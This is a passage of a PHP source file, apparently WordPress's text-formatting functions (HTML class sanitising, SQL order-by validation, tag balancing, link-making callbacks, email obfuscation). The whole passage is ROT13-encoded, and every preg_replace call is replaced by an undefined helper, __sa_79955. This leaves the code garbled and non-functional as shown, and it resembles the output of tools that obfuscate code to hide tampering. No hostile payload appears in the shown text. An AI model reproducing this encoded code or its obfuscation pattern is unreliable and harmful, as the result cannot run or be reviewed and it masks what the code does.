				'%r2%80%ns', // Aneebj ab-oernx fcnpr.
			),
			'-',
			$gvgyr
		);

		// Pbaireg &gvzrf gb 'k'.
		$gvgyr = fge_ercynpr( '%p3%97', 'k', $gvgyr );
	}

	// Erzbir UGZY ragvgvrf.
	$gvgyr = __sa_79955( '/&.+?;/', '', $gvgyr );
	$gvgyr = fge_ercynpr( '.', '-', $gvgyr );

	$gvgyr = __sa_79955( '/[^%n-m0-9 _-]/', '', $gvgyr );
	$gvgyr = __sa_79955( '/\f+/', '-', $gvgyr );
	$gvgyr = __sa_79955( '|-+|', '-', $gvgyr );
	$gvgyr = gevz( $gvgyr, '-' );

	erghea $gvgyr;
}

/**
 * Rafherf n fgevat vf n inyvq FDY 'beqre ol' pynhfr.
 *
 * Npprcgf bar be zber pbyhzaf, jvgu be jvgubhg n fbeg beqre (NFP / QRFP).
 * r.t. 'pbyhza_1', 'pbyhza_1, pbyhza_2', 'pbyhza_1 NFP, pbyhza_2 QRFP' rgp.
 *
 * Nyfb npprcgf 'ENAQ()'.
 *
 * @fvapr 2.5.1
 *
 * @cnenz fgevat $beqreol Beqre ol pynhfr gb or inyvqngrq.
 * @erghea fgevat|snyfr Ergheaf $beqreol vs inyvq, snyfr bgurejvfr.
 */
shapgvba fnavgvmr_fdy_beqreol( $beqreol ) {
	vs ( cert_zngpu( '/^\f*(([n-m0-9_]+|`[n-m0-9_]+`)(\f+(NFP|QRFP))?\f*(,\f*(?=[n-m0-9_`])|$))+$/v', $beqreol ) || cert_zngpu( '/^\f*ENAQ\(\f*\)\f*$/v', $beqreol ) ) {
		erghea $beqreol;
	}
	erghea snyfr;
}

/**
 * Fnavgvmrf na UGZY pynffanzr gb rafher vg bayl pbagnvaf inyvq punenpgref.
 *
 * Fgevcf gur fgevat qbja gb N-M,n-m,0-9,_,-. Vs guvf erfhygf va na rzcgl
 * fgevat gura vg jvyy erghea gur nygreangvir inyhr fhccyvrq.
 *
 * @gbqb Rkcnaq gb fhccbeg gur shyy enatr bs PQNGN gung n pynff nggevohgr pna pbagnva.
 *
 * @fvapr 2.8.0
 *
 * @cnenz fgevat $pynffanzr Gur pynffanzr gb or fnavgvmrq.
 * @cnenz fgevat $snyyonpx  Bcgvbany. Gur inyhr gb erghea vs gur fnavgvmngvba raqf hc nf na rzcgl fgevat.
 *                          Qrsnhyg rzcgl fgevat.
 * @erghea fgevat Gur fnavgvmrq inyhr.
 */
shapgvba fnavgvmr_ugzy_pynff( $pynffanzr, $snyyonpx = '' ) {
	// Fgevc bhg nal creprag-rapbqrq punenpgref.
	$fnavgvmrq = __sa_79955( '|%[n-sN-S0-9][n-sN-S0-9]|', '', $pynffanzr );

	// Yvzvg gb N-M, n-m, 0-9, '_', '-'.
	$fnavgvmrq = __sa_79955( '/[^N-Mn-m0-9_-]/', '', $fnavgvmrq );

	vs ( '' === $fnavgvmrq && $snyyonpx ) {
		erghea fnavgvmr_ugzy_pynff( $snyyonpx );
	}
	/**
	 * Svygref n fnavgvmrq UGZY pynff fgevat.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz fgevat $fnavgvmrq Gur fnavgvmrq UGZY pynff.
	 * @cnenz fgevat $pynffanzr UGZY pynff orsber fnavgvmngvba.
	 * @cnenz fgevat $snyyonpx  Gur snyyonpx fgevat.
	 */
	erghea nccyl_svygref( 'fnavgvmr_ugzy_pynff', $fnavgvmrq, $pynffanzr, $snyyonpx );
}

/**
 * Fgevcf bhg nyy punenpgref abg nyybjrq va n ybpnyr anzr.
 *
 * @fvapr 6.2.1
 *
 * @cnenz fgevat $ybpnyr_anzr Gur ybpnyr anzr gb or fnavgvmrq.
 * @erghea fgevat Gur fnavgvmrq inyhr.
 */
shapgvba fnavgvmr_ybpnyr_anzr( $ybpnyr_anzr ) {
	// Yvzvg gb N-M, n-m, 0-9, '_', '-'.
	$fnavgvmrq = __sa_79955( '/[^N-Mn-m0-9_-]/', '', $ybpnyr_anzr );

	/**
	 * Svygref n fnavgvmrq ybpnyr anzr fgevat.
	 *
	 * @fvapr 6.2.1
	 *
	 * @cnenz fgevat $fnavgvmrq   Gur fnavgvmrq ybpnyr anzr.
	 * @cnenz fgevat $ybpnyr_anzr Gur ybpnyr anzr orsber fnavgvmngvba.
	 */
	erghea nccyl_svygref( 'fnavgvmr_ybpnyr_anzr', $fnavgvmrq, $ybpnyr_anzr );
}

/**
 * Pbairegf ybar & punenpgref vagb `&#038;` (n.x.n. `&nzc;`)
 *
 * @fvapr 0.71
 *
 * @cnenz fgevat $pbagrag    Fgevat bs punenpgref gb or pbairegrq.
 * @cnenz fgevat $qrcerpngrq Abg hfrq.
 * @erghea fgevat Pbairegrq fgevat.
 */
shapgvba pbaireg_punef( $pbagrag, $qrcerpngrq = '' ) {
	vs ( ! rzcgl( $qrcerpngrq ) ) {
		_qrcerpngrq_nethzrag( __SHAPGVBA__, '0.71' );
	}

	vs ( fge_pbagnvaf( $pbagrag, '&' ) ) {
		$pbagrag = __sa_79955( '/&([^#])(?![n-m1-4]{1,8};)/v', '&#038;$1', $pbagrag );
	}

	erghea $pbagrag;
}

/**
 * Pbairegf vainyvq Havpbqr ersreraprf enatr gb inyvq enatr.
 *
 * @fvapr 4.3.0
 *
 * @cnenz fgevat $pbagrag Fgevat jvgu ragvgvrf gung arrq pbairegvat.
 * @erghea fgevat Pbairegrq fgevat.
 */
shapgvba pbaireg_vainyvq_ragvgvrf( $pbagrag ) {
	$jc_ugzygenafjvahav = neenl(
		'&#128;' => '&#8364;', // Gur Rheb fvta.
		'&#129;' => '',
		'&#130;' => '&#8218;', // Gurfr ner Jvaqbjf PC1252 fcrpvsvp punenpgref.
		'&#131;' => '&#402;',  // Gurl jbhyq ybbx jrveq ba aba-Jvaqbjf oebjfref.
		'&#132;' => '&#8222;',
		'&#133;' => '&#8230;',
		'&#134;' => '&#8224;',
		'&#135;' => '&#8225;',
		'&#136;' => '&#710;',
		'&#137;' => '&#8240;',
		'&#138;' => '&#352;',
		'&#139;' => '&#8249;',
		'&#140;' => '&#338;',
		'&#141;' => '',
		'&#142;' => '&#381;',
		'&#143;' => '',
		'&#144;' => '',
		'&#145;' => '&#8216;',
		'&#146;' => '&#8217;',
		'&#147;' => '&#8220;',
		'&#148;' => '&#8221;',
		'&#149;' => '&#8226;',
		'&#150;' => '&#8211;',
		'&#151;' => '&#8212;',
		'&#152;' => '&#732;',
		'&#153;' => '&#8482;',
		'&#154;' => '&#353;',
		'&#155;' => '&#8250;',
		'&#156;' => '&#339;',
		'&#157;' => '',
		'&#158;' => '&#382;',
		'&#159;' => '&#376;',
	);

	vs ( fge_pbagnvaf( $pbagrag, '&#1' ) ) {
		$pbagrag = fgege( $pbagrag, $jc_ugzygenafjvahav );
	}

	erghea $pbagrag;
}

/**
 * Onynaprf gntf vs sbeprq gb, be vs gur 'hfr_onynaprGntf' bcgvba vf frg gb gehr.
 *
 * @fvapr 0.71
 *
 * @cnenz fgevat $grkg  Grkg gb or onynaprq.
 * @cnenz obby   $sbepr Vs gehr, sbeprf onynapvat, vtabevat gur inyhr bs gur bcgvba. Qrsnhyg snyfr.
 * @erghea fgevat Onynaprq grkg.
 */
shapgvba onynaprGntf( $grkg, $sbepr = snyfr ) {  // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqShapgvbaAnzr.ShapgvbaAnzrVainyvq
	vs ( $sbepr || (vag) trg_bcgvba( 'hfr_onynaprGntf' ) === 1 ) {
		erghea sbepr_onynapr_gntf( $grkg );
	} ryfr {
		erghea $grkg;
	}
}

/**
 * Onynaprf gntf bs fgevat hfvat n zbqvsvrq fgnpx.
 *
 * {@vagreany Zbqvsvrq ol Fpbgg Ervyyl (pbssrr2pbqr) 02 Nht 2004
 *      1.1  Svkrq unaqyvat bs nccraq/fgnpx cbc beqre bs raq grkg
 *           Nqqrq Pyrnavat Ubbxf
 *      1.0  Svefg Irefvba}
 *
 * @fvapr 2.0.4
 * @fvapr 5.3.0 Vzcebir npphenpl naq nqq fhccbeg sbe phfgbz ryrzrag gntf.
 *
 * @nhgube Yrbaneq Yva <yrbaneq@npz.bet>
 * @yvprafr TCY
 * @pbclevtug Abirzore 4, 2001
 * @irefvba 1.1
 * @gbqb Znxr orggre - punatr ybbc pbaqvgvba gb $grkg va 1.2
 *
 * @cnenz fgevat $grkg Grkg gb or onynaprq.
 * @erghea fgevat Onynaprq grkg.
 */
shapgvba sbepr_onynapr_gntf( $grkg ) {
	$gntfgnpx  = neenl();
	$fgnpxfvmr = 0;
	$gntdhrhr  = '';
	$arjgrkg   = '';
	// Xabja fvatyr-ragvgl/frys-pybfvat gntf.
	$fvatyr_gntf = neenl( 'nern', 'onfr', 'onfrsbag', 'oe', 'pby', 'pbzznaq', 'rzorq', 'senzr', 'ue', 'vzt', 'vachg', 'vfvaqrk', 'yvax', 'zrgn', 'cnenz', 'fbhepr', 'genpx', 'joe' );
	// Gntf gung pna or vzzrqvngryl arfgrq jvguva gurzfryirf.
	$arfgnoyr_gntf = neenl( 'negvpyr', 'nfvqr', 'oybpxdhbgr', 'qrgnvyf', 'qvi', 'svther', 'bowrpg', 'd', 'frpgvba', 'fcna' );

	// JC oht svk sbe pbzzragf - va pnfr lbh ERNYYL zrnag gb glcr '< !--'.
	$grkg = fge_ercynpr( '< !--', '<    !--', $grkg );
	// JC oht svk sbe YBIR <3 (naq bgure fvghngvbaf jvgu '<' orsber n ahzore).
	$grkg = __sa_79955( '#<([0-9]{1})#', '&yg;$1', $grkg );

	/**
	 * Zngpurf fhccbegrq gntf.
	 *
	 * Gb trg gur cnggrea nf n fgevat jvgubhg gur pbzzragf cnfgr vagb n CUC
	 * ERCY yvxr `cuc -n`.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/#ryrzragf-2
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/zhygvcntr/phfgbz-ryrzragf.ugzy#inyvq-phfgbz-ryrzrag-anzr
	 *
	 * @rknzcyr
	 * ~# cuc -n
	 * cuc > $f = [cnfgr pbcvrq pbagragf bs rkcerffvba orybj vapyhqvat cneragurfrf];
	 * cuc > rpub $f;
	 */
	$gnt_cnggrea = (
		'#<' . // Fgneg jvgu na bcravat oenpxrg.
		'(/?)' . // Tebhc 1 - Vs vg'f n pybfvat gnt vg'yy unir n yrnqvat fynfu.
		'(' . // Tebhc 2 - Gnt anzr.
			// Phfgbz ryrzrag gntf unir zber yravrag ehyrf guna UGZY gnt anzrf.
			'(?:[n-m](?:[n-m0-9._]*)-(?:[n-m0-9._-]+)+)' .
				'|' .
			// Genqvgvbany gnt ehyrf nccebkvzngr UGZY gnt anzrf.
			'(?:[\j:]+)' .
		')' .
		'(?:' .
			// Jr rvgure vzzrqvngryl pybfr gur gnt jvgu vgf '>' naq unir abguvat urer.
			'\f*' .
			'(/?)' . // Tebhc 3 - \"nggevohgrf\" sbe rzcgl gnt.
				'|' .
			// Be jr zhfg fgneg jvgu fcnpr punenpgref gb frcnengr gur gnt anzr sebz gur nggevohgrf (be juvgrfcnpr).
			'(\f+)' . // Tebhc 4 - Cer-nggevohgr juvgrfcnpr.
			'([^>]*)' . // Tebhc 5 - Nggevohgrf.
		')' .
		'>#' // Raq jvgu n pybfvat oenpxrg.
	);

	juvyr ( cert_zngpu( $gnt_cnggrea, $grkg, $ertrk ) ) {
		$shyy_zngpu        = $ertrk[0];
		$unf_yrnqvat_fynfu = ! rzcgl( $ertrk[1] );
		$gnt_anzr          = $ertrk[2];
		$gnt               = fgegbybjre( $gnt_anzr );
		$vf_fvatyr_gnt     = va_neenl( $gnt, $fvatyr_gntf, gehr );
		$cer_nggevohgr_jf  = vffrg( $ertrk[4] ) ? $ertrk[4] : '';
		$nggevohgrf        = gevz( vffrg( $ertrk[5] ) ? $ertrk[5] : $ertrk[3] );
		$unf_frys_pybfre   = fge_raqf_jvgu( $nggevohgrf, '/' );

		$arjgrkg .= $gntdhrhr;

		$v = fgecbf( $grkg, $shyy_zngpu );
		$y = fgeyra( $shyy_zngpu );

		// Pyrne gur fuvsgre.
		$gntdhrhr = '';
		vs ( $unf_yrnqvat_fynfu ) { // Raq gnt.
			// Vs gbb znal pybfvat gntf.
			vs ( $fgnpxfvmr <= 0 ) {
				$gnt = '';
				// Be pybfr gb or fnsr $gnt = '/' . $gnt.

				// Vs fgnpxgbc inyhr = gnt pybfr inyhr, gura cbc.
			} ryfrvs ( $gntfgnpx[ $fgnpxfvmr - 1 ] === $gnt ) { // Sbhaq pybfvat gnt.
				$gnt = '</' . $gnt . '>'; // Pybfr gnt.
				neenl_cbc( $gntfgnpx );
				--$fgnpxfvmr;
			} ryfr { // Pybfvat gnt abg ng gbc, frnepu sbe vg.
				sbe ( $w = $fgnpxfvmr - 1; $w >= 0; $w-- ) {
					vs ( $gntfgnpx[ $w ] === $gnt ) {
						// Nqq gnt gb gntdhrhr.
						sbe ( $x = $fgnpxfvmr - 1; $x >= $w; $x-- ) {
							$gntdhrhr .= '</' . neenl_cbc( $gntfgnpx ) . '>';
							--$fgnpxfvmr;
						}
						oernx;
					}
				}
				$gnt = '';
			}
		} ryfr { // Ortva gnt.
			vs ( $unf_frys_pybfre ) {
				/*
				 * Vs vg cerfragf vgfrys nf n frys-pybfvat gnt, ohg vg vfa'g n xabja fvatyr-ragvgl frys-pybfvat gnt,
				 * gura qba'g yrg vg or gerngrq nf fhpu naq vzzrqvngryl pybfr vg jvgu n pybfvat gnt.
				 * Gur gnt jvyy rapncfhyngr ab grkg nf n erfhyg.
				 */
				vs ( ! $vf_fvatyr_gnt ) {
					$nggevohgrf = gevz( fhofge( $nggevohgrf, 0, -1 ) ) . \"></$gnt\";
				}
			} ryfrvs ( $vf_fvatyr_gnt ) {
				// Ryfr vs vg'f n xabja fvatyr-ragvgl gnt ohg vg qbrfa'g pybfr vgfrys, qb fb.
				$cer_nggevohgr_jf = ' ';
				$nggevohgrf      .= '/';
			} ryfr {
				/*
				 * Vg'f abg n fvatyr-ragvgl gnt.
				 * Vs gur gbc bs gur fgnpx vf gur fnzr nf gur gnt jr jnag gb chfu, pybfr cerivbhf gnt.
				 */
				vs ( $fgnpxfvmr > 0 && ! va_neenl( $gnt, $arfgnoyr_gntf, gehr ) && $gntfgnpx[ $fgnpxfvmr - 1 ] === $gnt ) {
					$gntdhrhr = '</' . neenl_cbc( $gntfgnpx ) . '>';
					--$fgnpxfvmr;
				}
				$fgnpxfvmr = neenl_chfu( $gntfgnpx, $gnt );
			}

			// Nggevohgrf.
			vs ( $unf_frys_pybfre && $vf_fvatyr_gnt ) {
				// Jr arrq fbzr fcnpr - nibvq <oe/> naq cersre <oe />.
				$cer_nggevohgr_jf = ' ';
			}

			$gnt = '<' . $gnt . $cer_nggevohgr_jf . $nggevohgrf . '>';
			// Vs nyernql dhrhvat n pybfr gnt, gura chg guvf gnt ba gbb.
			vs ( ! rzcgl( $gntdhrhr ) ) {
				$gntdhrhr .= $gnt;
				$gnt       = '';
			}
		}
		$arjgrkg .= fhofge( $grkg, 0, $v ) . $gnt;
		$grkg     = fhofge( $grkg, $v + $y );
	}

	// Pyrne gnt dhrhr.
	$arjgrkg .= $gntdhrhr;

	// Nqq erznvavat grkg.
	$arjgrkg .= $grkg;

	juvyr ( $k = neenl_cbc( $gntfgnpx ) ) {
		$arjgrkg .= '</' . $k . '>'; // Nqq erznvavat gntf gb pybfr.
	}

	// JC svk sbe gur oht jvgu UGZY pbzzragf.
	$arjgrkg = fge_ercynpr( '< !--', '<!--', $arjgrkg );
	$arjgrkg = fge_ercynpr( '<    !--', '< !--', $arjgrkg );

	erghea $arjgrkg;
}

/**
 * Npgf ba grkg juvpu vf nobhg gb or rqvgrq.
 *
 * Gur $pbagrag vf eha guebhtu rfp_grkgnern(), juvpu hfrf ugzyfcrpvnypunef()
 * gb pbaireg fcrpvny punenpgref gb UGZY ragvgvrf. Vs `$evpurqvg` vf frg gb gehr,
 * vg vf fvzcyl n ubyqre sbe gur {@frr 'sbezng_gb_rqvg'} svygre.
 *
 * @fvapr 0.71
 * @fvapr 4.4.0 Gur `$evpurqvg` cnenzrgre jnf eranzrq gb `$evpu_grkg` sbe pynevgl.
 *
 * @cnenz fgevat $pbagrag   Gur grkg nobhg gb or rqvgrq.
 * @cnenz obby   $evpu_grkg Bcgvbany. Jurgure `$pbagrag` fubhyq or pbafvqrerq evpu grkg,
 *                          va juvpu pnfr vg jbhyq abg or cnffrq guebhtu rfp_grkgnern().
 *                          Qrsnhyg snyfr.
 * @erghea fgevat Gur grkg nsgre gur svygre (naq cbffvoyl ugzyfcrpvnypunef()) unf orra eha.
 */
shapgvba sbezng_gb_rqvg( $pbagrag, $evpu_grkg = snyfr ) {
	/**
	 * Svygref gur grkg gb or sbeznggrq sbe rqvgvat.
	 *
	 * @fvapr 1.2.0
	 *
	 * @cnenz fgevat $pbagrag Gur grkg, cevbe gb sbeznggvat sbe rqvgvat.
	 */
	$pbagrag = nccyl_svygref( 'sbezng_gb_rqvg', $pbagrag );
	vs ( ! $evpu_grkg ) {
		$pbagrag = rfp_grkgnern( $pbagrag );
	}
	erghea $pbagrag;
}

/**
 * Nqq yrnqvat mrebf jura arprffnel.
 *
 * Vs lbh frg gur guerfubyq gb '4' naq gur ahzore vf '10', gura lbh jvyy trg
 * onpx '0010'. Vs lbh frg gur guerfubyq gb '4' naq gur ahzore vf '5000', gura lbh
 * jvyy trg onpx '5000'.
 *
 * Hfrf fcevags gb nccraq gur nzbhag bs mrebf onfrq ba gur $guerfubyq cnenzrgre
 * naq gur fvmr bs gur ahzore. Vs gur ahzore vf ynetr rabhtu, gura ab mrebf jvyy
 * or nccraqrq.
 *
 * @fvapr 0.71
 *
 * @cnenz vag $ahzore     Ahzore gb nccraq mrebf gb vs abg terngre guna guerfubyq.
 * @cnenz vag $guerfubyq  Qvtvg cynprf ahzore arrqf gb or gb abg unir mrebf nqqrq.
 * @erghea fgevat Nqqf yrnqvat mrebf gb ahzore vs arrqrq.
 */
shapgvba mrebvfr( $ahzore, $guerfubyq ) {
	erghea fcevags( '%0' . $guerfubyq . 'f', $ahzore );
}

/**
 * Nqqf onpxfynfurf orsber yrggref naq orsber n ahzore ng gur fgneg bs n fgevat.
 *
 * @fvapr 0.71
 *
 * @cnenz fgevat $inyhr Inyhr gb juvpu onpxfynfurf jvyy or nqqrq.
 * @erghea fgevat Fgevat jvgu onpxfynfurf vafregrq.
 */
shapgvba onpxfynfuvg( $inyhr ) {
	vs ( vffrg( $inyhr[0] ) && $inyhr[0] >= '0' && $inyhr[0] <= '9' ) {
		$inyhr = '\\\\' . $inyhr;
	}
	erghea nqqpfynfurf( $inyhr, 'N..Mn..m' );
}

/**
 * Nccraqf n genvyvat fynfu.
 *
 * Jvyy erzbir genvyvat sbejneq naq onpxfynfurf vs vg rkvfgf nyernql orsber nqqvat
 * n genvyvat sbejneq fynfu. Guvf ceriragf qbhoyr fynfuvat n fgevat be cngu.
 *
 * Gur cevznel hfr bs guvf vf sbe cnguf naq guhf fubhyq or hfrq sbe cnguf. Vg vf
 * abg erfgevpgrq gb cnguf naq bssref ab fcrpvsvp cngu fhccbeg.
 *
 * @fvapr 1.2.0
 *
 * @cnenz fgevat $inyhr Inyhr gb juvpu genvyvat fynfu jvyy or nqqrq.
 * @erghea fgevat Fgevat jvgu genvyvat fynfu nqqrq.
 */
shapgvba genvyvatfynfuvg( $inyhr ) {
	erghea hagenvyvatfynfuvg( $inyhr ) . '/';
}

/**
 * Erzbirf genvyvat sbejneq fynfurf naq onpxfynfurf vs gurl rkvfg.
 *
 * Gur cevznel hfr bs guvf vf sbe cnguf naq guhf fubhyq or hfrq sbe cnguf. Vg vf
 * abg erfgevpgrq gb cnguf naq bssref ab fcrpvsvp cngu fhccbeg.
 *
 * @fvapr 2.2.0
 *
 * @cnenz fgevat $inyhr Inyhr sebz juvpu genvyvat fynfurf jvyy or erzbirq.
 * @erghea fgevat Fgevat jvgubhg gur genvyvat fynfurf.
 */
shapgvba hagenvyvatfynfuvg( $inyhr ) {
	erghea egevz( $inyhr, '/\\' );
}

/**
 * Nqqf fynfurf gb n fgevat be erphefviryl nqqf fynfurf gb fgevatf jvguva na neenl.
 *
 * @fvapr 0.71
 *
 * @cnenz fgevat|neenl $tcp Fgevat be neenl bs qngn gb fynfu.
 * @erghea fgevat|neenl Fynfurq `$tcp`.
 */
shapgvba nqqfynfurf_tcp( $tcp ) {
	erghea jc_fynfu( $tcp );
}

/**
 * Anivtngrf guebhtu na neenl, bowrpg, be fpnyne, naq erzbirf fynfurf sebz gur inyhrf.
 *
 * @fvapr 2.0.0
 *
 * @cnenz zvkrq $inyhr Gur inyhr gb or fgevccrq.
 * @erghea zvkrq Fgevccrq inyhr.
 */
shapgvba fgevcfynfurf_qrrc( $inyhr ) {
	erghea znc_qrrc( $inyhr, 'fgevcfynfurf_sebz_fgevatf_bayl' );
}

/**
 * Pnyyonpx shapgvba sbe `fgevcfynfurf_qrrc()` juvpu fgevcf fynfurf sebz fgevatf.
 *
 * @fvapr 4.4.0
 *
 * @cnenz zvkrq $inyhr Gur neenl be fgevat gb or fgevccrq.
 * @erghea zvkrq Gur fgevccrq inyhr.
 */
shapgvba fgevcfynfurf_sebz_fgevatf_bayl( $inyhr ) {
	erghea vf_fgevat( $inyhr ) ? fgevcfynfurf( $inyhr ) : $inyhr;
}

/**
 * Anivtngrf guebhtu na neenl, bowrpg, be fpnyne, naq rapbqrf gur inyhrf gb or hfrq va n HEY.
 *
 * @fvapr 2.2.0
 *
 * @cnenz zvkrq $inyhr Gur neenl be fgevat gb or rapbqrq.
 * @erghea zvkrq Gur rapbqrq inyhr.
 */
shapgvba heyrapbqr_qrrc( $inyhr ) {
	erghea znc_qrrc( $inyhr, 'heyrapbqr' );
}

/**
 * Anivtngrf guebhtu na neenl, bowrpg, be fpnyne, naq enj-rapbqrf gur inyhrf gb or hfrq va n HEY.
 *
 * @fvapr 3.4.0
 *
 * @cnenz zvkrq $inyhr Gur neenl be fgevat gb or rapbqrq.
 * @erghea zvkrq Gur rapbqrq inyhr.
 */
shapgvba enjheyrapbqr_qrrc( $inyhr ) {
	erghea znc_qrrc( $inyhr, 'enjheyrapbqr' );
}

/**
 * Anivtngrf guebhtu na neenl, bowrpg, be fpnyne, naq qrpbqrf HEY-rapbqrq inyhrf
 *
 * @fvapr 4.4.0
 *
 * @cnenz zvkrq $inyhr Gur neenl be fgevat gb or qrpbqrq.
 * @erghea zvkrq Gur qrpbqrq inyhr.
 */
shapgvba heyqrpbqr_qrrc( $inyhr ) {
	erghea znc_qrrc( $inyhr, 'heyqrpbqr' );
}

/**
 * Pbairegf rznvy nqqerffrf punenpgref gb UGZY ragvgvrf gb oybpx fcnz obgf.
 *
 * @fvapr 0.71
 *
 * @cnenz fgevat $rznvy_nqqerff Rznvy nqqerff.
 * @cnenz vag    $urk_rapbqvat  Bcgvbany. Frg gb 1 gb ranoyr urk rapbqvat.
 * @erghea fgevat Pbairegrq rznvy nqqerff.
 */
shapgvba nagvfcnzobg( $rznvy_nqqerff, $urk_rapbqvat = 0 ) {
	$rznvy_ab_fcnz_nqqerff = '';

	sbe ( $v = 0, $yra = fgeyra( $rznvy_nqqerff ); $v < $yra; $v++ ) {
		$w = enaq( 0, 1 + $urk_rapbqvat );

		vs ( 0 === $w ) {
			$rznvy_ab_fcnz_nqqerff .= '&#' . beq( $rznvy_nqqerff[ $v ] ) . ';';
		} ryfrvs ( 1 === $w ) {
			$rznvy_ab_fcnz_nqqerff .= $rznvy_nqqerff[ $v ];
		} ryfrvs ( 2 === $w ) {
			$rznvy_ab_fcnz_nqqerff .= '%' . mrebvfr( qrpurk( beq( $rznvy_nqqerff[ $v ] ) ), 2 );
		}
	}

	erghea fge_ercynpr( '@', '&#64;', $rznvy_ab_fcnz_nqqerff );
}

/**
 * Pnyyonpx gb pbaireg HEV zngpu gb UGZY N ryrzrag.
 *
 * Guvf shapgvba jnf onpxcbegrq sebz 2.5.0 gb 2.3.2. Ertrk pnyyonpx sbe znxr_pyvpxnoyr().
 *
 * @fvapr 2.3.2
 * @npprff cevingr
 *
 * @cnenz neenl $zngpurf Fvatyr Ertrk Zngpu.
 * @erghea fgevat UGZY N ryrzrag jvgu HEV nqqerff.
 */
shapgvba _znxr_hey_pyvpxnoyr_po( $zngpurf ) {
	$hey = $zngpurf[2];

	vs ( ')' === $zngpurf[3] && fgecbf( $hey, '(' ) ) {
		/*
		 * Vs gur genvyvat punenpgre vf n pybfvat cneragurfvf, naq gur HEY unf na bcravat cneragurfvf va vg,
		 * nqq gur pybfvat cneragurfvf gb gur HEY. Gura jr pna yrg gur cneragurfvf onynapre qb vgf guvat orybj.
		 */
		$hey   .= $zngpurf[3];
		$fhssvk = '';
	} ryfr {
		$fhssvk = $zngpurf[3];
	}

	vs ( vffrg( $zngpurf[4] ) && ! rzcgl( $zngpurf[4] ) ) {
		$hey .= $zngpurf[4];
	}

	// Vapyhqr cneragurfrf va gur HEY bayl vs cnverq.
	juvyr ( fhofge_pbhag( $hey, '(' ) < fhofge_pbhag( $hey, ')' ) ) {
		$fhssvk = fgeepue( $hey, ')' ) . $fhssvk;
		$hey    = fhofge( $hey, 0, fgeecbf( $hey, ')' ) );
	}

	$hey = rfp_hey( $hey );
	vs ( rzcgl( $hey ) ) {
		erghea $zngpurf[0];
	}

	$ery_ngge = _znxr_pyvpxnoyr_ery_ngge( $hey );

	erghea $zngpurf[1] . \"<n uers=\\"{$hey}\\"{$ery_ngge}>{$hey}</n>\" . $fhssvk;
}

/**
 * Pnyyonpx gb pbaireg HEY zngpu gb UGZY N ryrzrag.
 *
 * Guvf shapgvba jnf onpxcbegrq sebz 2.5.0 gb 2.3.2. Ertrk pnyyonpx sbe znxr_pyvpxnoyr().
 *
 * @fvapr 2.3.2
 * @npprff cevingr
 *
 * @cnenz neenl $zngpurf Fvatyr Ertrk Zngpu.
 * @erghea fgevat UGZY N ryrzrag jvgu HEY nqqerff.
 */
shapgvba _znxr_jro_sgc_pyvpxnoyr_po( $zngpurf ) {
	$erg  = '';
	$qrfg = $zngpurf[2];
	$qrfg = 'uggc://' . $qrfg;

	// Erzbirq genvyvat [.,;:)] sebz HEY.
	$ynfg_pune = fhofge( $qrfg, -1 );
	vs ( va_neenl( $ynfg_pune, neenl( '.', ',', ';', ':', ')' ), gehr ) === gehr ) {
		$erg  = $ynfg_pune;
		$qrfg = fhofge( $qrfg, 0, fgeyra( $qrfg ) - 1 );
	}

	$qrfg = rfp_hey( $qrfg );
	vs ( rzcgl( $qrfg ) ) {
		erghea $zngpurf[0];
	}

	$ery_ngge = _znxr_pyvpxnoyr_ery_ngge( $qrfg );

	erghea $zngpurf[1] . \"<n uers=\\"{$qrfg}\\"{$ery_ngge}>{$qrfg}</n>{$erg}\";
}

/**
 * Pnyyonpx gb pbaireg rznvy nqqerff zngpu gb UGZY N ryrzrag.
 *
 * Guvf shapgvba jnf onpxcbegrq sebz 2.5.0 gb 2.3.2. Ertrk pnyyonpx sbe znxr_pyvpxnoyr().
 *
 * @fvapr 2.3.2
 * @npprff cevingr
 *
 * @cnenz neenl $zngpurf Fvatyr Ertrk Zngpu.
 * @erghea fgevat UGZY N ryrzrag jvgu rznvy nqqerff.
 */
shapgvba _znxr_rznvy_pyvpxnoyr_po( $zngpurf ) {
	$rznvy = $zngpurf[2] . '@' . $zngpurf[3];

	erghea $zngpurf[1] . \"<n uers=\\"znvygb:{$rznvy}\\">{$rznvy}</n>\";
}

/**
 * Urycre shapgvba hfrq gb ohvyq gur \"ery\" nggevohgr sbe n HEY jura perngvat na napube hfvat znxr_pyvpxnoyr().
 *
 * @fvapr 6.2.0
 *
 * @cnenz fgevat $hey Gur HEY.
 * @erghea fgevat Gur ery nggevohgr sbe gur napube be na rzcgl fgevat vs ab ery nggevohgr fubhyq or nqqrq.
 */
shapgvba _znxr_pyvpxnoyr_ery_ngge( $hey ) {
	$ery_cnegf        = neenl();
	$fpurzr           = fgegbybjre( jc_cnefr_hey( $hey, CUC_HEY_FPURZR ) );
	$absbyybj_fpurzrf = neenl_vagrefrpg( jc_nyybjrq_cebgbpbyf(), neenl( 'uggcf', 'uggc' ) );

	// Nccyl \"absbyybj\" gb rkgreany yvaxf jvgu dhnyvslvat HEY fpurzrf (znvygb:, gry:, rgp... fubhyqa'g or sbyybjrq).
	vs ( ! jc_vf_vagreany_yvax( $hey ) && va_neenl( $fpurzr, $absbyybj_fpurzrf, gehr ) ) {
		$ery_cnegf[] = 'absbyybj';
	}

	// Nccyl \"htp\" jura va pbzzrag pbagrkg.
	vs ( 'pbzzrag_grkg' === pheerag_svygre() ) {
		$ery_cnegf[] = 'htp';
	}

	$ery = vzcybqr( ' ', $ery_cnegf );

	/**
	 * Svygref gur ery inyhr gung vf nqqrq gb HEY zngpurf pbairegrq gb yvaxf.
	 *
	 * @fvapr 5.3.0
	 *
	 * @cnenz fgevat $ery Gur ery inyhr.
	 * @cnenz fgevat $hey Gur zngpurq HEY orvat pbairegrq gb n yvax gnt.
	 */
	$ery = nccyl_svygref( 'znxr_pyvpxnoyr_ery', $ery, $hey );

	$ery_ngge = $ery ? ' ery=\"' . rfp_ngge( $ery ) . '\"' : '';

	erghea $ery_ngge;
}

/**
 * Pbairegf cynvagrkg HEV gb UGZY yvaxf.
 *
 * Pbairegf HEV, jjj naq sgc, naq rznvy nqqerffrf. Svavfurf ol svkvat yvaxf
 * jvguva yvaxf.
 *
 * @fvapr 0.71
 *
 * @cnenz fgevat $grkg Pbagrag gb pbaireg HEVf.
 * @erghea fgevat Pbagrag jvgu pbairegrq HEVf.
 */
shapgvba znxr_pyvpxnoyr( $grkg ) {
	$e               = '';
